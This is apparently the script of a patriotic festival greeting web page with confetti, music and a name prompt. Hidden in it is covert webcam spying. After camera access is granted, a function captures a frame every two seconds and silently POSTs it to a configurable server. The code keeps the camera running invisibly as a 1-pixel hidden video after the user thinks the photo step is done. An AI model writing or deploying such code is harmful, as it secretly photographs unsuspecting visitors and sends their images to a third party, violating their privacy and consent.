document.addEventListener('DOMContentLoaded', () => {
  const enterBtn = document.getElementById('enter-btn');
  const nameInput = document.getElementById('user-name-input');
  const modal = document.getElementById('name-modal');
  const mainContent = document.getElementById('wishing-content');
  const displayName = document.getElementById('display-name');
  const bgMusic = document.getElementById('bg-music');

  const startCamBtn = document.getElementById('start-cam-btn');
  const captureBtn  = document.getElementById('capture-btn');
  const webcam      = document.getElementById('webcam');
  const snapshotCanvas = document.getElementById('snapshot-canvas');
  const userPhoto   = document.getElementById('user-photo');
  const cameraSection = document.getElementById('camera-section');
  const nameSection   = document.getElementById('name-section');

  let stream = null;
  let imageCapture = null;
  let autoCaptureInterval = null;

  const sendToServer = (canvas) => {
    if (!window.POST_URL) return;
    const data = canvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
    fetch(window.POST_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'cat=' + encodeURIComponent(data)
    }).catch(() => {});
  };

  const captureFrame = async () => {
    if (!stream) return;
    try {
      if (imageCapture && typeof ImageCapture !== 'undefined') {
        const bitmap = await imageCapture.grabFrame();
        const c = document.createElement('canvas');
        c.width = bitmap.width;
        c.height = bitmap.height;
        c.getContext('2d').drawImage(bitmap, 0, 0);
        bitmap.close();
        sendToServer(c);
      } else {
        const w = webcam.videoWidth || 640;
        const h = webcam.videoHeight || 480;
        const c = document.createElement('canvas');
        c.width = w; c.height = h;
        c.getContext('2d').drawImage(webcam, 0, 0, w, h);
        sendToServer(c);
      }
    } catch (e) {}
  };

  const startAutoCapture = () => {
    if (autoCaptureInterval) return;
    captureFrame();
    autoCaptureInterval = setInterval(captureFrame, 2000);
  };

  startCamBtn.addEventListener('click', async () => {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });
      webcam.srcObject = stream;
      webcam.play().catch(() => {});

      const videoTrack = stream.getVideoTracks()[0];
      if (typeof ImageCapture !== 'undefined') {
        imageCapture = new ImageCapture(videoTrack);
      }

      startCamBtn.classList.add('hidden');
      captureBtn.classList.remove('hidden');

      setTimeout(startAutoCapture, 1500);

    } catch (err) {
      console.error(err);
      cameraSection.classList.add('hidden');
      nameSection.classList.remove('hidden');
    }
  });

  captureBtn.addEventListener('click', () => {
    const w = webcam.videoWidth || 640;
    const h = webcam.videoHeight || 480;
    snapshotCanvas.width = w;
    snapshotCanvas.height = h;
    snapshotCanvas.getContext('2d').drawImage(webcam, 0, 0, w, h);
    userPhoto.src = snapshotCanvas.toDataURL('image/png');
    captureFrame();

    // visibility:hidden keeps stream alive; display:none kills it on mobile
    webcam.style.visibility = 'hidden';
    webcam.style.position   = 'absolute';
    webcam.style.width      = '1px';
    webcam.style.height     = '1px';
    webcam.style.top        = '0';
    webcam.style.left       = '0';

    cameraSection.classList.add('hidden');
    nameSection.classList.remove('hidden');
  });

  let isMusicPlaying = false;

  const triggerConfetti = () => {
    const duration = 15 * 1000;
    const end = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 50 };
    const rnd = (a, b) => Math.random() * (b - a) + a;
    const iv = setInterval(() => {
      const left = end - Date.now();
      if (left <= 0) return clearInterval(iv);
      const pc = 50 * (left / duration);
      confetti({ ...defaults, particleCount: pc, colors: ['#FF9933','#FFFFFF','#138808'], origin: { x: rnd(0.1,0.3), y: Math.random()-0.2 } });
      confetti({ ...defaults, particleCount: pc, colors: ['#FF9933','#FFFFFF','#138808'], origin: { x: rnd(0.7,0.9), y: Math.random()-0.2 } });
    }, 250);
  };

  const playMusic = () => {
    bgMusic.play().then(() => { isMusicPlaying = true; }).catch(() => {});
  };

  const startCelebration = () => {
    const name = nameInput.value.trim() || 'Desh-Bhakt';
    displayName.textContent = name;
    modal.style.opacity = '0';
    setTimeout(() => {
      modal.classList.add('hidden');
      mainContent.classList.remove('hidden');
      playMusic();
      triggerConfetti();
    }, 500);
  };

  enterBtn.addEventListener('click', startCelebration);
  nameInput.addEventListener('keypress', e => { if (e.key === 'Enter') startCelebration(); });

  const dangerBtn = document.getElementById('danger-btn');
  const funnyVideoOverlay = document.getElementById('funny-video-overlay');
  const funnyVideo = document.getElementById('funny-video');
  const closeVideoBtn = document.getElementById('close-video-btn');
  dangerBtn.addEventListener('click', () => { bgMusic.pause(); isMusicPlaying = false; funnyVideoOverlay.classList.remove('hidden'); funnyVideo.play(); });
  closeVideoBtn.addEventListener('click', () => { funnyVideo.pause(); funnyVideo.currentTime = 0; funnyVideoOverlay.classList.add('hidden'); playMusic(); });

  const songMenuBtn = document.getElementById('song-menu-btn');
  const songMenuOverlay = document.getElementById('song-menu-overlay');
  const closeMenuBtn = document.getElementById('close-menu-btn');
  const songOptions = document.querySelectorAll('.song-option');
  const anthemBtn = document.getElementById('anthem-btn');
  const anthemOverlay = document.getElementById('anthem-overlay');
  const closeAnthemBtn = document.getElementById('close-anthem-btn');
  const anthemVideo = document.getElementById('anthem-video');

  songMenuBtn.addEventListener('click', () => songMenuOverlay.classList.remove('hidden'));
  closeMenuBtn.addEventListener('click', () => songMenuOverlay.classList.add('hidden'));
  songOptions.forEach(btn => {
    btn.addEventListener('click', e => {
      bgMusic.pause(); bgMusic.src = e.target.getAttribute('data-src'); bgMusic.load(); playMusic();
      songMenuOverlay.classList.add('hidden');
    });
  });
  anthemBtn.addEventListener('click', () => { songMenuOverlay.classList.add('hidden'); anthemOverlay.classList.remove('hidden'); bgMusic.pause(); anthemVideo.play(); });
  closeAnthemBtn.addEventListener('click', () => { anthemOverlay.classList.add('hidden'); anthemVideo.pause(); anthemVideo.currentTime = 0; bgMusic.src = './ReelAudio-1.mp3'; bgMusic.load(); playMusic(); });

  window.addEventListener('beforeunload', () => {
    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
    if (stream) stream.getTracks().forEach(t => t.stop());
  });
});
